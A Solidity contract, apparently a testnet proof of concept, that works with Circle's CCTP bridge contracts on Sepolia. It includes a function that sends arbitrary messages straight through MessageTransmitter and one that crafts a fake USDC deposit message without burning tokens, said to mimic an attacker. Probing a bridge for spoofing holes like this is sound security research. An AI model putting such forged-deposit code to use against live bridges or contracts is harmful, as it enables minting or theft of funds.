// SPDX-License-Identifier: MIT
pragma solidity .8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IMessageTransmitter {
    function sendMessage(
        uint32 destinationDomain,
        bytes32 recipient,
        bytes calldata messageBody
    ) external returns (uint64 nonce);
}

interface ITokenMessenger {
    function depositForBurn(
        uint256 amount,
        uint32 destinationDomain,
        bytes32 mintRecipient,
        address burnToken
    ) external returns (uint64 nonce);
}

contract CCTPMessageTest is Ownable {
    // MessageTransmitterV2 Address (Sepolia)
    IMessageTransmitter public constant messageTransmitter =
        IMessageTransmitter(0xE737e5cEBEEBa77EFE34D4aa090756590b1CE275);

    // TokenMessengerV2 Address (Sepolia)
    ITokenMessenger public constant tokenMessenger =
        ITokenMessenger(0x8FE6B999Dc680CcFDD5Bf7EB0974218be2542DAA);

    // USDC Address (Sepolia USDC)
    address public constant usdc =
        0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238;

    event MessageSent(uint64 nonce, bytes message);

    constructor() {}

    // Function to send a message directly through MessageTransmitter
    // This bypasses TokenMessenger.depositForBurn() entirely
    function sendDirectMessage(
        uint32 destinationDomain,
        bytes32 recipientAddress,
        bytes calldata arbitraryMessage
    ) external onlyOwner returns (uint64 nonce) {
        // Call MessageTransmitter directly with arbitrary message content
        nonce = messageTransmitter.sendMessage(
            destinationDomain,
            recipientAddress,
            arbitraryMessage
        );

        emit MessageSent(nonce, arbitraryMessage);
        return nonce;
    }

    // Function to create a fake USDC deposit message
    // This mimics what the attacker would have sent
    function sendFakeUSDCDeposit(
        uint32 destinationDomain,
        bytes32 recipientAddress,
        uint256 fakeAmount
    ) external onlyOwner returns (uint64 nonce) {
        // Create a message body that looks like a USDC deposit
        // but without actually burning any tokens
        bytes memory fakeDepositMessage = abi.encode(
            usdc,                // token address
            fakeAmount,          // amount (fake)
            recipientAddress     // mint recipient
        );

        // Send directly through MessageTransmitter
        nonce = messageTransmitter.sendMessage(
            destinationDomain,
            recipientAddress,
            fakeDepositMessage
        );

        emit MessageSent(nonce, fakeDepositMessage);
        return nonce;
    }

    // Function to demonstrate the normal flow through TokenMessenger
    function sendNormalDeposit(
        uint256 amount,
        uint32 destinationDomain,
        bytes32 mintRecipient
    ) external onlyOwner returns (uint64 nonce) {
        // This requires you to actually have USDC tokens to burn
        nonce = tokenMessenger.depositForBurn(
            amount,
            destinationDomain,
            mintRecipient,
            usdc
        );

        emit MessageSent(nonce, abi.encode(usdc, amount, mintRecipient));
        return nonce;
    }
}
